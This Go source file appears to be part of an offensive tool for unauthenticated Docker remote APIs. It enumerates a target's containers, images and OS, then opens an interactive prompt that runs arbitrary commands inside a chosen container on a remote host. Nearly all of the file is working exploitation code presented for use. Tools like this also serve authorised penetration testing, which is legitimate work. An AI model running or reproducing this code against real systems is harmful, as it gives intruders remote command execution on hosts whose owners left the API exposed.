package main

import (
	"context"
	"fmt"
	"io/ioutil"
	"strings"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/client"
	"github.com/manifoldco/promptui"
)

func gatherInformation(api *vulnerableDockerAPI) error {
	docker, err := client.NewClient(api.Endpoint, getXYDockerVersion(api.DockerVersion), nil, nil)
	if err != nil {
		return err
	}

	info, err := docker.Info(context.Background())
	if err != nil {
		return err
	}

	api.Info.ContainersRunning = info.ContainersRunning
	api.Info.ContainersStopped = info.ContainersStopped
	api.Info.Images = info.Images
	api.Info.OS = info.OperatingSystem

	containers, err := docker.ContainerList(context.Background(), types.ContainerListOptions{})
	if err != nil {
		return err
	}

	for _, container := range containers {
		api.Containers = append(api.Containers, dockerContainer{
			Image: container.Image,
			ID:    container.ID,
			Ports: fmt.Sprintf("%v", container.Ports),
		})
	}

	images, err := docker.ImageList(context.Background(), types.ImageListOptions{})
	if err != nil {
		return err
	}

	for _, image := range images {
		if len(image.RepoTags) == 0 {
			continue
		}

		api.Images = append(api.Images, image.RepoTags[0])
	}

	return nil
}

func rootAccess(targets []vulnerableDockerAPI) error {
	for {
		var targetList []string
		tmap := make(map[string]vulnerableDockerAPI)
		for _, t := range targets {
			targetList = append(targetList, t.Endpoint)
			tmap[t.Endpoint] = t
		}
		targetList = append(targetList, "exit")

		prompt := promptui.Select{
			Label: "Select target",
			Items: targetList,
		}

		_, targetEndpoint, err := prompt.Run()
		if err != nil {
			return err
		}

		if targetEndpoint == "exit" {
			return nil
		}

		target := tmap[targetEndpoint]

		var containerList []string
		cmap := make(map[string]dockerContainer)
		for _, c := range target.Containers {
			containerList = append(containerList, c.ID)
			cmap[c.ID] = c
		}
		containerList = append(containerList, "back")

		for {
			prompt = promptui.Select{
				Label: "Select container",
				Items: containerList,
			}

			_, containerID, err := prompt.Run()
			if err != nil {
				return err
			}

			if containerID == "back" {
				break
			}

			docker, err := client.NewClient(target.Endpoint, "1.39", nil, nil)
			if err != nil {
				return err
			}

			for {
				prompt := promptui.Prompt{
					Label: containerID[:6] + " $>",
					Templates: &promptui.PromptTemplates{
						Prompt:  "{{ . }} ",
						Valid:   "{{ . }} ",
						Invalid: "{{ . }} ",
						Success: "{{ . }} ",
					},
				}

				command, err := prompt.Run()
				if err != nil {
					return err
				}

				if command == "exit" {
					break
				}

				output, err := execCommand(docker, containerID, command)
				if err != nil {
					return err
				}

				fmt.Println(output)
			}
		}
	}

	return nil
}

func execCommand(docker *client.Client, containerID, command string) (string, error) {
	exec, err := docker.ContainerExecCreate(context.Background(), containerID, types.ExecConfig{
		// AttachStdin:  true,
		AttachStderr: true,
		AttachStdout: true,
		// Privileged:   true,
		// Tty: true,
		Cmd: strings.Split(command, " "),
	})
	if err != nil {
		return "", err
	}

	response, err := docker.ContainerExecAttach(context.Background(), exec.ID, types.ExecStartCheck{})
	defer response.Close()
	if err != nil {
		return "", err
	}

	r, err := ioutil.ReadAll(response.Reader)
	if err != nil {
		return "", err
	}

	return string(r), nil
}

func getXYDockerVersion(version string) string {
	xyz := strings.Split(version, ".")

	return strings.Join(xyz[:2], ".")
}